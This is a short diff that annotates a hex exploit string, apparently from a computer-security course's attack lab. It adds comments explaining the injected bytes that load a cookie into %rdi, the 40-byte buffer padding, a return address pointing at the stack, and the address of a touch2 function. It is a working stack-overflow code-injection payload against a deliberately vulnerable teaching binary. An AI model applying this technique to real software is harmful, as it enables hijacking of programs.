@@ -1,7 +1,7 @@
-48 c7 c7 1b 91 ef 7f c3
+48 c7 c7 1b 91 ef 7f c3 /* Copies cookie into %rdi */
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 /* 40 bytes of buffer */
 08 c9 65 55 00 00 00 00 /* Address of %rsp    */
-02 13 40 00 00 00 00 00
+02 13 40 00 00 00 00 00 /* Address of touch2  */
